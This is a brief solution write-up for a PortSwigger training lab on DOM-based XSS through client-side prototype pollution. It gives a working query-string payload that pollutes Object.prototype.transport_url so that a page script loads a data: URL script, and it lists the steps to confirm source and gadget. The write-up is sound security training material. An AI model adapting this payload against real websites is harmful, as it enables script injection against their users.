# Lab 05 — DOM XSS via client-side prototype pollution

> **Practitioner** · [Official lab](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

**Entry point:** `searchLogger.js` appends a `<script>` from
`config.transport_url` — pollute it.

## Solution

```
/?__proto__[transport_url]=data:,alert(1);
```

1. Confirm the source: `/?__proto__[foo]=bar` → `Object.prototype.foo`.
2. Confirm the gadget: no own `transport_url` on `config` → inherited.
3. Inject: a `<script src="data:,alert(1);">` element renders —
   lab solved.
